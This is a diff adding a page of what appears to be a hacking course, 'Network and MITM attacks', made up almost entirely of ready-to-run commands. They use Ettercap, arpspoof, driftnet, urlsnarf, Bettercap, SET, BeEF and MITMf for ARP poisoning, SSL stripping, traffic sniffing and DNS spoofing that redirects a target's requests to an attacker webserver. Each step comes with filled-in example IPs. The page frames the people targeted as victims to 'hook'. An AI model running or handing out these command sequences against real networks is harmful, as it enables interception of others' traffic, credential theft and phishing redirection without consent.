@@ -1,0 +1,623 @@
+<head>
+ <title>
+  Act II
+ </title>
+ <meta content="application/xhtml+xml; charset=utf-8" http-equiv="content-type"/>
+ <link href="../1.ico" rel="shortcut icon" type="image/x-icon"/>
+ <link href="../css/style.css" media="screen" rel="stylesheet" type="text/css">
+ </link>
+</head>
+<body>
+ <div class="wrap background">
+  <div id="logo">
+   <div class="clear">
+   </div>
+   <div id="left">
+    <center>
+     <h1>
+      <a href="../2.html">
+       <font color="White">
+        Act II
+       </font>
+      </a>
+     </h1>
+     <h2>
+      <font color="black">
+       Network and MITM attacks
+      </font>
+     </h2>
+    </center>
+    <p class="subtitle">
+     MITM Tools Syntax
+    </p>
+    Ensure you installed the pre-requisites.
+    <br/>
+    <br/>
+    In Terminal on Kali:
+    <br/>
+    <font color="red">
+     sudo apt-get update &amp;&amp; sudo apt-get install bettercap leafpad dsniff driftnet python3-pip python-pip python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file -y &amp;&amp; sudo apt autoremove -y
+    </font>
+    <br/>
+    <br/>
+    <br/>
+    <h3>
+     <font color="green">
+      Ettercap
+     </font>
+    </h3>
+    Assuming you've modified the config files already.
+    <br/>
+    <br/>
+    In Kali open up a new Terminal window and type the following:
+    <br/>
+    <font color="red">
+     sudo service apache2 restart
+     <br/>
+     sudo ettercap -Tq -P sslstrip -P dns_spoof -M arp -i INTERFACE /TARGET_IP// /ROUTER_IP//
+    </font>
+    <br/>
+    <br/>
+    <i>
+     Example:
+     <br/>
+    </i>
+    I've scanned the network and found a target of interest with an IP of 192.168.2.100' my interface is wlan0' and I've determined the router IP is 192.168.2.1.
+    <br/>
+    <font color="red">
+     sudo ettercap -Tq -P sslstrip -P dns_spoof -M arp -i wlan0 /192.168.2.100// /192.168.2.1//
+    </font>
+    <br/>
+    Note the double "//" is required.
+    <br/>
+    <br/>
+    When complete press the letter "
+    <font color="red">
+     q
+    </font>
+    " on your keyboard to shutdown Ettercap properly.
+    <br/>
+    <br/>
+    <br/>
+    <h3>
+     <font color="green">
+      Arpspoof
+     </font>
+    </h3>
+    In Kali open up a new Terminal window and type the following:
+    <br/>
+    <font color="red">
+     sudo sysctl -w net.ipv4.ip_forward=1
+     <br/>
+     sudo arpspoof -i INTERFACE -t TARGET_IP ROUTER_IP
+     <br/>
+    </font>
+    Open a new Terminal window
+    <br/>
+    <font color="red">
+     sudo arpspoof -i INTERFACE -t ROUTER_IP TARGET_IP
+     <br/>
+    </font>
+    Open a new Terminal window
+    <br/>
+    <font color="red">
+     sudo driftnet -i INTERFACE -pa
+     <br/>
+    </font>
+    Open a new Terminal window
+    <br/>
+    <font color="red">
+     sudo urlsnarf -i INTERFACE
+     <br/>
+     <br/>
+    </font>
+    <i>
+     Example:
+    </i>
+    <br/>
+    My interface is eth0' my target IP is 192.168.2.100' and the router IP is 192.168.2.1:
+    <br/>
+    <font color="red">
+     <i>
+      sudo sysctl -w net.ipv4.ip_forward=1
+      <br/>
+      sudo arpspoof -i eth0 192.168.2.100 192.168.2.1
+      <br/>
+     </i>
+    </font>
+    Open a new Terminal window
+    <br/>
+    <font color="red">
+     sudo arpspoof -i eth0 192.168.2.1 192.168.2.100
+     <br/>
+    </font>
+    Open a new Terminal window
+    <br/>
+    <font color="red">
+     sudo driftnet -i eth0 -pa
+     <br/>
+    </font>
+    Open a new Terminal window
+    <br/>
+    <font color="red">
+     sudo urlsnarf -i eth0
+     <br/>
+     <br/>
+    </font>
+    <br/>
+    <h3>
+     <font color="green">
+      Bettercap
+     </font>
+    </h3>
+    <h4>
+     <font color="blue">
+      Intercepting
+      <u>
+       HTTP
+      </u>
+      traffic over the network with Bettercap
+     </font>
+    </h4>
+    In Kali open up a new Terminal window and type the following:
+    <br/>
+    <font color="red">
+     sudo bettercap
+    </font>
+    <br/>
+    All of the following commands below are to be entered into the bettercap window.
+    <br/>
+    <font color="red">
+     net.probe on
+    </font>
+    <br/>
+    Wait 30 seconds for it to discover network hosts.
+    <br/>
+    <font color="red">
+     net.probe off
+     <br/>
+     net.show
+     <br/>
+    </font>
+    This will show you the targets on the network. Pay attention to your target IP.
+    <br/>
+    <font color="red">
+     set http.proxy.sslstrip true
+     <br/>
+     set net.sniff.verbose false
+     <br/>
+     set arp.spoof.targets TARGET_IP
+     <br/>
+    </font>
+    My example:
+    <br/>
+    set arp.spoof.targets 192.168.2.100
+    <br/>
+    <font color="red">
+     net.sniff on
+     <br/>
+     http.proxy on
+     <br/>
+     arp.spoof on
+     <br/>
+     <br/>
+    </font>
+    <h4>
+     <font color="blue">
+      Intercepting
+      <u>
+       HTTPS
+      </u>
+      traffic over the network with Bettercap
+     </font>
+    </h4>
+    In Kali open up a new terminal window and type the following:
+    <br/>
+    <font color="red">
+     sudo bettercap
+    </font>
+    <br/>
+    All the following commands below are to be entered into the bettercap window.
+    <br/>
+    <font color="red">
+     net.probe on
+    </font>
+    <br/>
+    Wait 30 seconds for it to discover network hosts.
+    <br/>
+    <font color="red">
+     net.probe off
+     <br/>
+     net.show
+     <br/>
+    </font>
+    This will show you the targets on the network. Pay attention to your target IP.
+    <br/>
+    <font color="red">
+     set https.proxy.sslstrip true
+     <br/>
+     set net.sniff.verbose false
+     <br/>
+     set arp.spoof.targets TARGET_IP
+     <br/>
+    </font>
+    My example:
+    <br/>
+    set arp.spoof.targets 192.168.2.100
+    <br/>
+    <font color="red">
+     set arp.spoof.internal true
+     <br/>
+     net.sniff on
+     <br/>
+     https.proxy on
+     <br/>
+     arp.spoof on
+     <br/>
+    </font>
+    <br/>
+    <h4>
+     <font color="blue">
+      Re-directing
+      <u>
+       HTTP
+      </u>
+      requests to your webserver over the network with Bettercap
+     </font>
+    </h4>
+    In Kali open up a new Terminal window and type the following:
+    <br/>
+    <font color="red">
+     sudo service apache2 restart
+     <br/>
+     sudo bettercap
+    </font>
+    <br/>
+    All the following commands below are to be entered into the bettercap window.
+    <br/>
+    <font color="red">
+     net.probe on
+    </font>
+    <br/>
+    Wait 30 seconds for it to discover network hosts.
+    <br/>
+    <font color="red">
+     net.probe off
+     <br/>
+     net.show
+     <br/>
+    </font>
+    This will show you the targets on the network. Pay attention to your target IP.
+    <br/>
+    <font color="red">
+     set http.proxy.sslstrip true
+     <br/>
+     set net.sniff.verbose false
+     <br/>
+     set arp.spoof.targets TARGET_IP
+     <br/>
+    </font>
+    My example:
+    <br/>
+    set arp.spoof.targets 192.168.2.100
+    <br/>
+    <font color="red">
+     set dns.spoof.domains *
+     <br/>
+     set dns.spoof.address ATTACKER_IP
+     <br/>
+    </font>
+    My example:
+    <br/>
+    set dns.spoof.address 192.168.2.233
+    <br/>
+    <font color="red">
+     set dns.spoof.all true
+     <br/>
+     net.sniff on
+     <br/>
+     http.proxy on
+     <br/>
+     arp.spoof on
+     <br/>
+     dns.spoof on
+     <br/>
+    </font>
+    <br/>
+    <h4>
+     <font color="blue">
+      Re-directing
+      <u>
+       HTTPS
+      </u>
+      requests to your webserver over the network with Bettercap
+     </font>
+    </h4>
+    In Kali open up a new terminal window and type the following:
+    <br/>
+    <font color="red">
+     sudo service apache2 restart
+     <br/>
+     sudo bettercap
+    </font>
+    <br/>
+    All the following commands below are to be entered into the bettercap window.
+    <br/>
+    <font color="red">
+     net.probe on
+    </font>
+    <br/>
+    Wait 30 seconds for it to discover network hosts.
+    <br/>
+    <font color="red">
+     net.probe off
+     <br/>
+     net.show
+     <br/>
+    </font>
+    This will show you the targets on the network. Pay attention to your target IP.
+    <br/>
+    <font color="red">
+     set https.proxy.sslstrip true
+     <br/>
+     set net.sniff.verbose false
+     <br/>
+     set arp.spoof.targets TARGET_IP
+     <br/>
+    </font>
+    My example:
+    <br/>
+    set arp.spoof.targets 192.168.2.100
+    <br/>
+    <font color="red">
+     set dns.spoof.domains *
+     <br/>
+     set dns.spoof.address ATTACKER_IP
+     <br/>
+    </font>
+    My example:
+    <br/>
+    set dns.spoof.address 192.168.2.233
+    <br/>
+    <font color="red">
+     set dns.spoof.all true
+     <br/>
+     net.sniff on
+     <br/>
+     https.proxy on
+     <br/>
+     arp.spoof on
+     <br/>
+     dns.spoof on
+     <br/>
+    </font>
+    <br/>
+    <br/>
+    <br/>
+    <h3>
+     <font color="green">
+      Social Engineering Toolkit (SET)
+     </font>
+    </h3>
+    In Kali open up a new terminal window and type the following:
+    <br/>
+    <font color="red">
+     sudo service apache2 stop
+     <br/>
+     sudo setoolkit
+     <br/>
+    </font>
+    <br/>
+    <br/>
+    <br/>
+    <h3>
+     <font color="green">
+      The Browser Exploitation Framework Project (BeEF)
+     </font>
+    </h3>
+    Assuming you've modified the config files already.
+    <br/>
+    <br/>
+    In Kali open up a new terminal window and type the following:
+    <br/>
+    <font color="red">
+     cd beef
+     <br/>
+     sudo ./beef
+     <br/>
+    </font>
+    <br/>
+    Once BeEF finishes loading you'll be presented with the BeEF control panel information. Plug "http://127.0.0.1:3000/ui/panel" into your web browser and hit enter. Once at the login screen enter "TEST" for the username and password (or whatever you decided to change it to). You'll be greeted with the BeEF web control panel for the victims that you hook with BeEF.
+    <br/>
+    <br/>
+    <br/>
+    <br/>
+    <h3>
+     <font color="green">
+      Man-In-The-Middle Framework (MITMf)
+     </font>
+    </h3>
+    In Kali open up a new terminal window and type the following:
+    <br/>
+    <font color="red">
+     sudo python ~/MITMf/mitmf.py --hsts --arp --spoof --dns --gateway ROUTER_IP --target TARGET_IP --captive --portaldir /var/www/html -i INTERFACE
+    </font>
+    <br/>
+    <br/>
+    My example:
+    <br/>
+    My interface is wlan0' my target computer IP is 192.168.2.100' and my router IP is 192.168.2.1.
+    <br/>
+    <br/>
+    <font color="red">
+     sudo python ~/MITMf/mitmf.py --hsts --arp --spoof --dns --gateway 192.168.2.1 --target 192.168.2.100 --captive --portaldir /var/www/html -i wlan0
+    </font>
+    <br/>
+    <br/>
+    <div id="side">
+     <div class="boxtop">
+     </div>
+     <div class="box">
+      <center>
+       <span class="item">
+        <strong>
+         HackTown
+        </strong>
+        <br>
+         Hacking Courses
+        </br>
+       </span>
+      </center>
+     </div>
+     <div class="box">
+      <a href="Chapter-1.html">
+       <span class="item">
+        <strong>
+         Chapter 1
+        </strong>
+        <br>
+         Introduction
+        </br>
+       </span>
+      </a>
+     </div>
+     <div class="box">
+      <a href="Chapter-2.html">
+       <span class="item">
+        <strong>
+         Chapter 2
+        </strong>
+        <br>
+         Pre-requisites
+        </br>
+       </span>
+      </a>
+     </div>
+     <div class="box">
+      <a href="Chapter-3.html">
+       <span class="item">
+        <strong>
+         Chapter 3
+        </strong>
+        <br>
+         Private IPs
+        </br>
+       </span>
+      </a>
+     </div>
+     <div class="box">
+      <a href="Chapter-4.html">
+       <span class="item">
+        <strong>
+         Chapter 4
+        </strong>
+        <br>
+         Router admin interface
+        </br>
+       </span>
+      </a>
+     </div>
+     <div class="box">
+      <a href="Chapter-5.html">
+       <span class="item">
+        <strong>
+         Chapter 5
+        </strong>
+        <br>
+         Searching for targets
+        </br>
+       </span>
+      </a>
+     </div>
+     <div class="box">
+      <a href="Chapter-6.html">
+       <span class="item">
+        <strong>
+         Chapter 6
+        </strong>
+        <br>
+         Router exploitation
+        </br>
+       </span>
+      </a>
+     </div>
+     <div class="box">
+      <a href="Chapter-7.html">
+       <span class="item">
+        <strong>
+         Chapter 7
+        </strong>
+        <br>
+         Printer exploitation
+        </br>
+       </span>
+      </a>
+     </div>
+     <div class="box">
+      <a href="Chapter-8.html">
+       <span class="item">
+        <strong>
+         Chapter 8
+        </strong>
+        <br>
+         Brute forcing the router interface
+        </br>
+       </span>
+      </a>
+     </div>
+     <div class="box">
+      <a href="Chapter-9.html">
+       <span class="item">
+        <strong>
+         Chapter 9
+        </strong>
+        <br>
+         Getting up to date
+        </br>
+       </span>
+      </a>
+     </div>
+     <div class="box">
+      <a href="Chapter-10.html">
+       <span class="item">
+        <strong>
+         Chapter 10
+        </strong>
+        <br>
+         Who's DAT Man-In-The-Middle(MITM)
+        </br>
+       </span>
+      </a>
+     </div>
+     <div class="box">
+      <a href="Chapter-11.html">
+       <span class="item">
+        <strong>
+         Chapter 11
+        </strong>
+        <br>
+         One method to rule them all
+        </br>
+       </span>
+      </a>
+     </div>
+     <div class="box">
+      <a href="Conclusion.html">
+       <span class="item">
+        <strong>
+         Conclusion
+        </strong>
+        <br>
+        </br>
+       </span>
+      </a>
+     </div>
+     <div class="boxbottom">
+     </div>
+    </div>
+    <p id="ad">
+    </p>
+   </div>
+  </div>
+ </div>
+</body>
